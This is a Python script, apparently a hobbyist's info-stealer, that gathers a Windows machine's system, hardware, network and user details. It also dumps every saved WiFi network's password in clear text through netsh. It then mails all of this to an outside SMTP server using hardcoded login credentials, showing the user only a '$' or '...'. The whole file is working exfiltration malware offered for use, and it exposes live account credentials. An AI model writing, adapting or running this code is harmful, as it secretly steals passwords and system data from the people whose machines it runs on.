"""
Hossein Jalili
feb-11-2022
version 1.0.0

Extract important user information and send it to the server.
by https://mailtrap.io
"""
import datetime
from random import *
from colorama import Fore
import smtplib
import psutil
import platform
from datetime import datetime
import cpuinfo
import socket
import uuid
import re
import subprocess
import jdatetime
import getpass



####################################################
final_massage=""
def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def System_information():
            
    time_send0="Today time :\t"+str(jdatetime.date.today().strftime('%Y/%m/%d'))+"\t"+str(datetime.now().strftime('%H:%M:%S'))
    
    global t_send_main
    stimf0=("="*10+ "System Information"+ "="*10)
    uname = platform.uname()
    stimf1=(f"System: {uname.system}")
    stimf2=(f"Node Name: {uname.node}")
    stimf3=(f"Release: {uname.release}")
    stimf4=(f"Version: {uname.version}")
    stimf5=(f"Machine: {uname.machine}")
    stimf6=(f"Processor: {uname.processor}")
    stimf7=(f"Processor: {cpuinfo.get_cpu_info()['brand_raw']}")
    stimf8=(f"Ip-Address: {socket.gethostbyname(socket.gethostname())}")
    stimf9=(f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}")
    t_send_1="\n"+time_send0+"\n"+stimf0+"\n"+stimf1+"\n"+stimf2+"\n"+stimf3+"\n"+stimf4+"\n"+stimf5+"\n"+stimf6+"\n"+stimf7+"\n"+stimf8+"\n"+stimf9
    #-----------------------------

    # Boot Time
    btimf0=("="*10+ "Boot Time"+ "="*10)
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    btimf1=(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    t_send_2="\n"+btimf0 +"\n"+btimf1
    #-----------------------------

    # print CPU information
    cpimf0=("="*10+ "CPU Info"+ "="*10)
    # number of cores
    cpimf1=("Physical cores:"+ str(psutil.cpu_count(logical=False)))
    cpimf2=("Total cores:"+ str(psutil.cpu_count(logical=True)))
    # CPU frequencies
    cpufreq = psutil.cpu_freq()
    cpimf3=(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    cpimf4=(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    cpimf5=(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    t_send_3="\n"+cpimf0+"\n"+cpimf1+"\n"+cpimf2+"\n"+cpimf3+"\n"+cpimf4+"\n"+cpimf5
    #-----------------------------
    # CPU usage
    list_cpu_usage = []
    string_cpu_usage = ""
    cpuimf0=("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        list_cpu_usage.append(str(f"Core {i}: {percentage}%"))
    # print(list_cpu_usage)
    for ccc in range(len(list_cpu_usage)):
        string_cpu_usage=string_cpu_usage+"\n"+str(list_cpu_usage[ccc])
    # print(string_cpu_usage)
    cpuimf1=(f"Total CPU Usage: {psutil.cpu_percent()}%")
    t_send_4="\n"+cpuimf0 +string_cpu_usage+"\n"+cpuimf1
    #-----------------------------
    # Memory Information
    meminf0=("="*10+ "Memory Information"+ "="*10)
    # get the memory details
    svmem = psutil.virtual_memory()
    meminf1=(f"Total: {get_size(svmem.total)}")
    meminf2=(f"Available: {get_size(svmem.available)}")
    meminf3=(f"Used: {get_size(svmem.used)}")
    meminf4=(f"Percentage: {svmem.percent}%")

    meminf5=("="*5+ "SWAP"+ "="*5)
    # get the swap memory details (if exists)
    swap = psutil.swap_memory()
    meminf6=(f"Total: {get_size(swap.total)}")
    meminf7=(f"Free: {get_size(swap.free)}")
    meminf8=(f"Used: {get_size(swap.used)}")
    meminf9=(f"Percentage: {swap.percent}%")

    t_send_5="\n"+meminf0+"\n"+meminf1+"\n"+meminf2+"\n"+meminf3+"\n"+meminf4 +"\n"+meminf5+"\n"+meminf6+"\n"+meminf7+"\n"+meminf8+"\n"+meminf9
    #-----------------------------

    # Disk Information
    string_disk_info = ""
    list_disk_small = []

    hddif0=("="*10+ "Disk Information"+ "="*10)
    hddif1=("Partitions and Usage:")
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        list_disk_small.append(str(f"=== Device: {partition.device} ==="))
        list_disk_small.append(str(f"  Mountpoint: {partition.mountpoint}"))
        list_disk_small.append(str(f"  File system type: {partition.fstype}"))
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        list_disk_small.append(str(f"  Total Size: {get_size(partition_usage.total)}"))
        list_disk_small.append(str(f"  Used: {get_size(partition_usage.used)}"))
        list_disk_small.append(str(f"  Free: {get_size(partition_usage.free)}"))
        list_disk_small.append(str(f"  Percentage: {partition_usage.percent}%"))

    for lll in range(len(list_disk_small)):
        string_disk_info=string_disk_info+"\n"+str(list_disk_small[lll])

    # print(string_disk_info)
    
    #-----

    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    hddif2=(f"Total read: {get_size(disk_io.read_bytes)}")
    hddif3=(f"Total write: {get_size(disk_io.write_bytes)}")

    t_send_6= "\n"+hddif0 +"\n"+hddif1+string_disk_info +"\n"+hddif2+"\n"+hddif3
    # print(t_send_5)

    #-----------------------------


    ## Network information
    string_network_info = ""
    list_network_small = []
    netinf0=("="*10+ "Network Information"+ "="*10)
    ## get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            list_network_small.append(str(f"=== Interface: {interface_name} ==="))
            if str(address.family) == 'AddressFamily.AF_INET':
                list_network_small.append(str(f"  IP Address: {address.address}"))
                list_network_small.append(str(f"  Netmask: {address.netmask}"))
                list_network_small.append(str(f"  Broadcast IP: {address.broadcast}"))
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                list_network_small.append(str(f"  MAC Address: {address.address}"))
                list_network_small.append(str(f"  Netmask: {address.netmask}"))
                list_network_small.append(str(f"  Broadcast MAC: {address.broadcast}"))

    for nnn in range(len(list_network_small)):
        string_network_info=string_network_info+"\n"+str(list_network_small[nnn])

    t_send_7= "\n"+netinf0+string_network_info
    # print(t_send_6)
    #-----------------------------
    ##get IO statistics since boot
    net_io = psutil.net_io_counters()
    ioinf0=(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    ioinf1=(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
    t_send_8= "\nget IO statistics since boot:\n"+ioinf0+"\n"+ioinf1


    t_send_main=t_send_1+ t_send_2 + t_send_3 + t_send_4 + t_send_5 + t_send_6 + t_send_8
    




    # traverse the info
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []

    # arrange the string into clear info
    for item in Id:
        new.append(str(item.split("\r")[:-1]).strip("[]'"))
        # if 'Network Card(s):' in item:
        # 	break
    # for i in new:
        # print(i[2:-2])
        
    # hossein=input("Enter any key to exit")
    # print(new)
    """for u in range(len(new)):
        print(new[u])"""

    str_new=""
    for nnnn in range(len(new)):
        str_new=str_new+"\n"+str(new[nnnn])

    t_send_9= "\n\n"+str_new
    # print(t_send_8)
    t_send_main=t_send_main+t_send_9

    # print(t_send_5)

    #-------------------------------------

    list_wifi_small = []
    str_wifi=""
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    host_name = socket.gethostname()
    ip_addr = socket.gethostbyname(host_name)
    # print("\nDeveloped by #ho3j ")
    wifinf0=("____________________________________")
    try:
        wifinf1=str("os : \t\t\t"+platform.system())
        wifinf2=str("Windows version : \t"+platform.release())
        wifinf3=str("Windows 32/64bit : \t"+platform.machine())
        wifinf4=str("Windows User : \t\t"+getpass.getuser())
        wifinf5=str("Host Name: \t\t{0}".format(host_name))
        wifinf6=str("IP Address: \t\t{0}".format(ip_addr))
        wifinf7=""
    except:
        wifinf1=""
        wifinf2=""
        wifinf3=""
        wifinf4=""
        wifinf5=""
        wifinf6=""
        wifinf7=("can not print Information of windows ")
    wifinf8=("____________________________________\n\n")

    wifinf9=("List of WiFi and their passwords \nthat are connected to your system  ")
    wifinf10=("***********************************")
    t_send_10= "\n"+wifinf0+"\n"+wifinf1+"\n"+wifinf2+"\n"+wifinf3+"\n"+wifinf4+"\n"+wifinf5+"\n"+wifinf6+"\n"+wifinf7+"\n"+wifinf8+"\n"+wifinf9+"\n"+wifinf10
    try:
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

                try:
                    list_wifi_small.append(str ("{:<20}   {:<}".format(i, results[0])))
                except IndexError:
                    list_wifi_small.append(str ("{:<20}   {:<}".format(i, "")))

            except subprocess.CalledProcessError:
                list_wifi_small.append(str ("{:<20}   {:<}".format(i, "ENCODING ERROR")))
    except:
        list_wifi_small.append(str("can not print Information of wifi and pass "))

    # print(list_wifi_small) 

    for wififi in range(len(list_wifi_small)):
        str_wifi=str_wifi+"\n"+str(list_wifi_small[wififi])
    # print(str_wifi) 


    wifinf11=("***********************************")
    t_send_main=t_send_main+t_send_10+str_wifi+"\n"+wifinf11

    # --------------------------------------
        

###############################################


System_information()

my_systemm = platform.uname()
uuser=str(f"{my_systemm.node} ")

time_sendd=str(jdatetime.date.today())


# t_send="body"
sender = time_sendd+":::"+uuser
receiver = "hossein_jalili"

#---------------------------------------
message = f"""\
Subject: {sender}
To: {receiver}
From: {sender}

******** receiving information ********* 
{t_send_main}
**** end **** 
"""
try:
    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login("41cfd18328a865", "c5b57a19182009")
        server.sendmail(sender, receiver, message)
        print("$")
except:
    print("...")

#---------------------------------------



